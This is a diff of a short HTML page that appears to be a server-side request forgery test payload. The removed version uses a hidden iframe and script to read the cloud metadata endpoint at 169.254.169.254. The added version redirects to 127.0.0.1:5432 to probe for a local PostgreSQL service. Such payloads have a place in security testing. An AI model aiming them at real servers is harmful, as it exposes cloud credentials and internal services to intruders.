@@ -1,22 +1,9 @@
 <html>
-  <head>
-    <title>Fetch Azure Metadata via Iframe</title>
-  </head>
-  <body>
-    <h1>Fetching Azure Metadata via Iframe</h1>
-    <p>Attempting to fetch Azure metadata...</p>
-    <iframe id="azureIframe" src="http://169.254.169.254)" style="display:none;"></iframe>
-    <p id="result">Iframe response will appear here...</p>
-    <script>
-      const iframe = document.getElementById('azureIframe');
-      iframe.onload = function() {
-        try {
-          const response = iframe.contentWindow.document.body.innerText;
-          document.getElementById('result').innerText = 'Iframe response: ' + response;
-        } catch (e) {
-          document.getElementById('result').innerText = 'Error accessing iframe content: ' + e.message;
-        }
-      };
-    </script>
-  </body>
-</html>
+          <head>
+            <meta http-equiv="refresh" content="0;url=http://127.0.0.1:5432">
+          </head>
+          <body>
+            <p>Redirecting to 127.0.0.1:5432...</p>
+            <p>Looking for any services running on port 5432 (PostgreSQL).</p>
+          </body>
+        </html>
